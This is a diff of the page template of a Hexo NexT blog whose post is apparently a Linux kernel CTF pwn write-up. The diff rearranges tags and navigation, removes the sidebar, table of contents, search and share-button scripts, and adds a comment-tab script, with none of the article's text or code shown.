-            <a href="/tags/smep/" rel="tag"># smep</a>
-          
-            <a href="/tags/smap/" rel="tag"># smap</a>
-          
-            <a href="/tags/ret2usr/" rel="tag"># ret2usr</a>
-          
-        </div>
-      
-
-      
-      
-        <div class="post-widgets">
-        
-
-        
-
-        
-          
-          <div class="social_share">
-            
-            
-              <div id="needsharebutton-postbottom">
-                <span class="btn">
-                  <i class="fa fa-share-alt" aria-hidden="true"></i>
-                </span>
-              </div>
-            
-          </div>
-        
-        </div>
-      
-      
-
-      
-        <div class="post-nav">
-          <div class="post-nav-next post-nav-item">
-            
-              <a href="/2019/04/22/ciscn-2019-preliminaries/" rel="next" title="2019全国大学生信息安全竞赛(CISCN)初赛解题赛Pwn WriteUp">
-                <i class="fa fa-chevron-left"></i> 2019全国大学生信息安全竞赛(CISCN)初赛解题赛Pwn WriteUp
-              </a>
-            
+          <div class="post-tags">
+              <a href="/tags/kernel/" rel="tag"># kernel</a>
+              <a href="/tags/linux/" rel="tag"># linux</a>
+              <a href="/tags/pwn/" rel="tag"># pwn</a>
+              <a href="/tags/smep/" rel="tag"># smep</a>
+              <a href="/tags/smap/" rel="tag"># smap</a>
+              <a href="/tags/ret2usr/" rel="tag"># ret2usr</a>
           </div>
 
-          <span class="post-nav-divider"></span>
+        
 
-          <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2019/07/17/sctf2019-pwn/" rel="prev" title="SCTF 2019 pwn writeup">
-                SCTF 2019 pwn writeup <i class="fa fa-chevron-right"></i>
-              </a>
-            
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2019/04/22/ciscn-2019-preliminaries/" rel="prev" title="2019全国大学生信息安全竞赛(CISCN)初赛解题赛Pwn WriteUp">
+                  <i class="fa fa-chevron-left"></i> 2019全国大学生信息安全竞赛(CISCN)初赛解题赛Pwn WriteUp
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2019/07/17/sctf2019-pwn/" rel="next" title="SCTF 2019 pwn writeup">
+                  SCTF 2019 pwn writeup <i class="fa fa-chevron-right"></i>
+                </a>
+            </div>
           </div>
-        </div>
-      
-
-      
-      
     </footer>
-  </div>
-  
-  
-  
   </article>
-
-
-  </div>
-
-
-          </div>
-          
-
+  
+  
   
 
 
 
-        </div>
-        
-          
-  
-  <div class="sidebar-toggle">
-    <div class="sidebar-toggle-line-wrap">
-      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
-      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
-      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
-    </div>
-  </div>
-
-  <aside id="sidebar" class="sidebar">
-    <div class="sidebar-inner">
-
       
-
-      
-        <ul class="sidebar-nav motion-element">
-          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
-            文章目录
-          </li>
-          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
-            站点概览
-          </li>
-        </ul>
-      
-
-      <div class="site-overview-wrap sidebar-panel">
-        <div class="site-overview">
-          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
-            
-              <img class="site-author-image" itemprop="image"
-                src="/avatar/avatar.jpeg"
-                alt="sunichi"/>
-            
-              <p class="site-author-name" itemprop="name">sunichi</p>
-              <div class="site-description motion-element" itemprop="description"></div>
-          </div>
-
-          
-            <nav class="site-state motion-element">
-              
-                <div class="site-state-item site-state-posts">
-                
-                  <a href="/archives/">
-                
-                    <span class="site-state-item-count">46</span>
-                    <span class="site-state-item-name">日志</span>
-                  </a>
-                </div>
-              
-
-              
-
-              
-                
-                
-                <div class="site-state-item site-state-tags">
-                  
-                    
-                      <a href="/tags/">
-                    
-                  
-                    
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                    <span class="site-state-item-count">54</span>
-                    <span class="site-state-item-name">标签</span>
-                  </a>
-                </div>
-              
-            </nav>
-          
-
-          
-
-          
-            <div class="links-of-author motion-element">
-              
-                <span class="links-of-author-item">
-                  
-                  
-                    
-                  
-                  
-                    
-                  
-                  <a href="https://github.com/sunichi" title="GitHub &rarr; https://github.com/sunichi" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
-                </span>
-              
-                <span class="links-of-author-item">
-                  
-                  
-                    
-                  
-                  
-                    
-                  
-                  <a href="https://twitter.com/sunichi17" title="Twitter &rarr; https://twitter.com/sunichi17" rel="noopener" target="_blank"><i class="fa fa-fw fa-twitter"></i>Twitter</a>
-                </span>
-              
-            </div>
-          
-
-          
-
-          
-          
-            <div class="links-of-blogroll motion-element links-of-blogroll-block">
-              <div class="links-of-blogroll-title">
-                <i class="fa  fa-fw fa-link"></i>
-                Links
-              </div>
-              <ul class="links-of-blogroll-list">
-                
-                  <li class="links-of-blogroll-item">
-                    <a href="http://p4nda.top" title="http://p4nda.top" rel="noopener" target="_blank">P4nda</a>
-                  </li>
-                
-                  <li class="links-of-blogroll-item">
-                    <a href="https://blog.aisissel.cn/" title="https://blog.aisissel.cn/" rel="noopener" target="_blank">Sissel</a>
-                  </li>
-                
-                  <li class="links-of-blogroll-item">
-                    <a href="https://thinkycx.me/" title="https://thinkycx.me/" rel="noopener" target="_blank">thinkycx</a>
-                  </li>
-                
-              </ul>
-            </div>
-          
-
-          
-            
-          
-          
-
-        </div>
-      </div>
-
-      
-      <!--noindex-->
-        <div class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
-          <div class="post-toc">
-
-            
-            
-            
-            
-
-            
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#前置知识"><span class="nav-number">1.</span> <span class="nav-text">前置知识</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#KASLR"><span class="nav-number">1.1.</span> <span class="nav-text">KASLR</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#代码段和模块基地址"><span class="nav-number">1.1.1.</span> <span class="nav-text">代码段和模块基地址</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#栈基"><span class="nav-number">1.1.2.</span> <span class="nav-text">栈基</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#动态内存基"><span class="nav-number">1.1.3.</span> <span class="nav-text">动态内存基</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#SMEP-amp-SMAP"><span class="nav-number">1.2.</span> <span class="nav-text">SMEP&amp;SMAP</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#CISCN-2017-babydriver"><span class="nav-number">2.</span> <span class="nav-text">CISCN 2017 babydriver</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#UAF"><span class="nav-number">2.1.</span> <span class="nav-text">UAF</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Bypass-SMEP-amp-ret2usr"><span class="nav-number">2.2.</span> <span class="nav-text">Bypass SMEP &amp; ret2usr</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0CTF-2017-knote"><span class="nav-number">3.</span> <span class="nav-text">0CTF 2017 knote</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Midnight-Sun-CTF-Quals-hfsipc"><span class="nav-number">4.</span> <span class="nav-text">Midnight Sun CTF Quals hfsipc</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Hijack-cred"><span class="nav-number">4.1.</span> <span class="nav-text">Hijack cred</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Hijack-modprobe"><span class="nav-number">4.2.</span> <span class="nav-text">Hijack modprobe</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#CTF-2019-hackme"><span class="nav-number">5.</span> <span class="nav-text">*CTF 2019 hackme</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#SMEP开启的情况下"><span class="nav-number">5.1.</span> <span class="nav-text">SMEP开启的情况下</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#SMEP-amp-SMAP开启的情况下"><span class="nav-number">5.2.</span> <span class="nav-text">SMEP&amp;SMAP开启的情况下</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#musl-gcc"><span class="nav-number">6.</span> <span class="nav-text">musl-gcc</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Using-SSH-in-pwntools"><span class="nav-number">7.</span> <span class="nav-text">Using SSH in pwntools</span></a></li></ol></div>
-            
-
-          </div>
-        </div>
-      <!--/noindex-->
-      
-
-      
-
-    </div>
-  </aside>
-  
-
-
-        
-      </div>
-    </main>
-
-    <footer id="footer" class="footer">
-      <div class="footer-inner">
-        <div class="copyright">&copy; 2018 – <span itemprop="copyrightYear">2020</span>
-  <span class="with-love" id="animate">
-    <i class="fa fa-user"></i>
-  </span>
-  <span class="author" itemprop="copyrightHolder">sunichi</span>
-
-  
-
-  
-</div>
-
-
-  <div class="powered-by">由 <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> 强力驱动 v3.4.4</div>
-
-
-
-  <span class="post-meta-divider">|</span>
-
-
-
-  <div class="theme-info">主题 – <a href="https://theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> v7.0.1</div>
-
-
-
-
-        
-
-
-
-
-
-
-
-
-        
-      </div>
-    </footer>
-
-    
-      <div class="back-to-top">
-        <i class="fa fa-arrow-up"></i>
-        
-      </div>
-    
-
-    
-
-    
-
-    
-  </div>
-
-  
 
 <script>
-  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
-    window.Promise = null;
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      const activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      const commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
   }
 </script>
 
+    </div>
+  </main>
 
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-  
-  <script src="/lib/jquery/index.js?v=2.1.3"></script>
-
-  
-  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
-
-  
-  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
-
-
-  
-
-
-  <script src="/js/src/utils.js?v=7.0.1"></script>
-
-  <script src="/js/src/motion.js?v=7.0.1"></script>
-
-
-
-  
-  
-
-
-  <script src="/js/src/schemes/muse.js?v=7.0.1"></script>
-
-
-
-  
-  <script src="/js/src/scrollspy.js?v=7.0.1"></script>
-<script src="/js/src/post-details.js?v=7.0.1"></script>
-
-
-
-  
-
-
-  <script src="/js/src/next-boot.js?v=7.0.1"></script>
-
-
-  
-
-  
-
-  
-
-  
-
-
-  
-
-
-  
-  <script>
-    // Popup Window;
-    var isfetched = false;
-    var isXml = true;
-    // Search DB path;
-    var search_path = "search.xml";
-    if (search_path.length === 0) {
-      search_path = "search.xml";
-    } else if (/json$/i.test(search_path)) {
-      isXml = false;
-    }
-    var path = "/" + search_path;
-    // monitor main search box;
-
-    var onPopupClose = function (e) {
-      $('.popup').hide();
-      $('#local-search-input').val('');
-      $('.search-result-list').remove();
-      $('#no-result').remove();
-      $(".local-search-pop-overlay").remove();
-      $('body').css('overflow', '');
-    }
-
-    function proceedsearch() {
-      $("body")
-        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
-        .css('overflow', 'hidden');
-      $('.search-popup-overlay').click(onPopupClose);
-      $('.popup').toggle();
-      var $localSearchInput = $('#local-search-input');
-      $localSearchInput.attr("autocapitalize", "none");
-      $localSearchInput.attr("autocorrect", "off");
-      $localSearchInput.focus();
-    }
-
-    // search function;
-    var searchFunc = function(path, search_id, content_id) {
-      'use strict';
-
-      // start loading animation
-      $("body")
-        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
-          '<div id="search-loading-icon">' +
-          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
-          '</div>' +
-          '</div>')
-        .css('overflow', 'hidden');
-      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+  <footer class="footer">
+    <div class="footer-inner">
+      
 
       
 
-      $.ajax({
-        url: path,
-        dataType: isXml ? "xml" : "json",
-        async: true,
-        success: function(res) {
-          // get the contents from search data
-          isfetched = true;
-          $('.popup').detach().appendTo('.header-inner');
-          var datas = isXml ? $("entry", res).map(function() {
-            return {
-              title: $("title", this).text(),
-              content: $("content",this).text(),
-              url: $("url" , this).text()
-            };
-          }).get() : res;
-          var input = document.getElementById(search_id);
-          var resultContent = document.getElementById(content_id);
-          var inputEventFunction = function() {
-            var searchText = input.value.trim().toLowerCase();
-            var keywords = searchText.split(/[\s\-]+/);
-            if (keywords.length > 1) {
-              keywords.push(searchText);
-            }
-            var resultItems = [];
-            if (searchText.length > 0) {
-              // perform local searching
-              datas.forEach(function(data) {
-                var isMatch = false;
-                var hitCount = 0;
-                var searchTextCount = 0;
-                var title = data.title.trim();
-                var titleInLowerCase = title.toLowerCase();
-                var content = data.content.trim().replace(/<[^>]+>/g,"");
-                
-                var contentInLowerCase = content.toLowerCase();
-                var articleUrl = decodeURIComponent(data.url).replace(/\/{2,}/g, '/');
-                var indexOfTitle = [];
-                var indexOfContent = [];
-                // only match articles with not empty titles
-                if(title != '') {
-                  keywords.forEach(function(keyword) {
-                    function getIndexByWord(word, text, caseSensitive) {
-                      var wordLen = word.length;
-                      if (wordLen === 0) {
-                        return [];
-                      }
-                      var startPosition = 0, position = [], index = [];
-                      if (!caseSensitive) {
-                        text = text.toLowerCase();
-                        word = word.toLowerCase();
-                      }
-                      while ((position = text.indexOf(word, startPosition)) > -1) {
-                        index.push({position: position, word: word});
-                        startPosition = position + wordLen;
-                      }
-                      return index;
-                    }
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">sunichi</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/muse/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
+  </div>
 
-                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
-                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
-                  });
-                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
-                    isMatch = true;
-                    hitCount = indexOfTitle.length + indexOfContent.length;
-                  }
-                }
+    </div>
+  </footer>
 
-                // show search results
+  
+  <script src="//cdn.jsdelivr.net/npm/animejs@3.2.0/lib/anime.min.js"></script>
+<script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script>
 
-                if (isMatch) {
-                  // sort index by position of keyword
+  
 
-                  [indexOfTitle, indexOfContent].forEach(function (index) {
-                    index.sort(function (itemLeft, itemRight) {
-                      if (itemRight.position !== itemLeft.position) {
-                        return itemRight.position - itemLeft.position;
-                      } else {
-                        return itemLeft.word.length - itemRight.word.length;
-                      }
-                    });
-                  });
 
-                  // merge hits into slices
 
-                  function mergeIntoSlice(text, start, end, index) {
-                    var item = index[index.length - 1];
-                    var position = item.position;
-                    var word = item.word;
-                    var hits = [];
-                    var searchTextCountInSlice = 0;
-                    while (position + word.length <= end && index.length != 0) {
-                      if (word === searchText) {
-                        searchTextCountInSlice++;
-                      }
-                      hits.push({position: position, length: word.length});
-                      var wordEnd = position + word.length;
 
-                      // move to next position of hit
 
-                      index.pop();
-                      while (index.length != 0) {
-                        item = index[index.length - 1];
-                        position = item.position;
-                        word = item.word;
-                        if (wordEnd > position) {
-                          index.pop();
-                        } else {
-                          break;
-                        }
-                      }
-                    }
-                    searchTextCount += searchTextCountInSlice;
-                    return {
-                      hits: hits,
-                      start: start,
-                      end: end,
-                      searchTextCount: searchTextCountInSlice
-                    };
-                  }
 
-                  var slicesOfTitle = [];
-                  if (indexOfTitle.length != 0) {
-                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
-                  }
 
-                  var slicesOfContent = [];
-                  while (indexOfContent.length != 0) {
-                    var item = indexOfContent[indexOfContent.length - 1];
-                    var position = item.position;
-                    var word = item.word;
-                    // cut out 100 characters
-                    var start = position - 20;
-                    var end = position + 80;
-                    if(start < 0){
-                      start = 0;
-                    }
-                    if (end < position + word.length) {
-                      end = position + word.length;
-                    }
-                    if(end > content.length){
-                      end = content.length;
-                    }
-                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
-                  }
 
-                  // sort slices in content by search text's count and hits' count
 
-                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
-                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
-                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
-                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
-                      return sliceRight.hits.length - sliceLeft.hits.length;
-                    } else {
-                      return sliceLeft.start - sliceRight.start;
-                    }
-                  });
 
-                  // select top N slices in content
 
-                  var upperBound = parseInt('1');
-                  if (upperBound >= 0) {
-                    slicesOfContent = slicesOfContent.slice(0, upperBound);
-                  }
 
-                  // highlight title and content
 
-                  function highlightKeyword(text, slice) {
-                    var result = '';
-                    var prevEnd = slice.start;
-                    slice.hits.forEach(function (hit) {
-                      result += text.substring(prevEnd, hit.position);
-                      var end = hit.position + hit.length;
-                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
-                      prevEnd = end;
-                    });
-                    result += text.substring(prevEnd, slice.end);
-                    return result;
-                  }
-
-                  var resultItem = '';
-
-                  if (slicesOfTitle.length != 0) {
-                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
-                  } else {
-                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
-                  }
-
-                  slicesOfContent.forEach(function (slice) {
-                    resultItem += "<a href='" + articleUrl + "'>" +
-                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
-                      "...</p>" + "</a>";
-                  });
-
-                  resultItem += "</li>";
-                  resultItems.push({
-                    item: resultItem,
-                    searchTextCount: searchTextCount,
-                    hitCount: hitCount,
-                    id: resultItems.length
-                  });
-                }
-              })
-            };
-            if (keywords.length === 1 && keywords[0] === "") {
-              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x"></i></div>'
-            } else if (resultItems.length === 0) {
-              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x"></i></div>'
-            } else {
-              resultItems.sort(function (resultLeft, resultRight) {
-                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
-                  return resultRight.searchTextCount - resultLeft.searchTextCount;
-                } else if (resultLeft.hitCount !== resultRight.hitCount) {
-                  return resultRight.hitCount - resultLeft.hitCount;
-                } else {
-                  return resultRight.id - resultLeft.id;
-                }
-              });
-              var searchResultList = '<ul class=\"search-result-list\">';
-              resultItems.forEach(function (result) {
-                searchResultList += result.item;
-              })
-              searchResultList += "</ul>";
-              resultContent.innerHTML = searchResultList;
-            }
-          }
-
-          if ('auto' === 'auto') {
-            input.addEventListener('input', inputEventFunction);
-          } else {
-            $('.search-icon').click(inputEventFunction);
-            input.addEventListener('keypress', function (event) {
-              if (event.keyCode === 13) {
-                inputEventFunction();
-              }
-            });
-          }
-
-          // remove loading animation
-          $(".local-search-pop-overlay").remove();
-          $('body').css('overflow', '');
-
-          proceedsearch();
-        }
-      });
-    }
-
-    // handle and trigger popup window;
-    $('.popup-trigger').click(function(e) {
-      e.stopPropagation();
-      if (isfetched === false) {
-        searchFunc(path, 'local-search-input', 'local-search-result');
-      } else {
-        proceedsearch();
-      };
-    });
-
-    $('.popup-btn-close').click(onPopupClose);
-    $('.popup').click(function(e){
-      e.stopPropagation();
-    });
-    $(document).on('keyup', function (event) {
-      var shouldDismissSearchPopup = event.which === 27 &&
-        $('.search-popup').is(':visible');
-      if (shouldDismissSearchPopup) {
-        onPopupClose();
-      }
-    });
-  </script>
 
 
 
@@ -1359,43 +436,12 @@
 
   
 
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-  
-  
-  <script src="/lib/needsharebutton/needsharebutton.js"></script>
-  <script>
-    
-      pbOptions = {};
-      
-        pbOptions.iconStyle = "default";
-      
-        pbOptions.boxForm = "horizontal";
-      
-        pbOptions.position = "bottomCenter";
-      
-        pbOptions.networks = "Weibo,Wechat,Twitter,Facebook,Evernote";
-      
-      new needShareButton('#needsharebutton-postbottom', pbOptions);
-    
-    
-  </script>
 
 
-  
 
-  
+
+
+
 
   
 
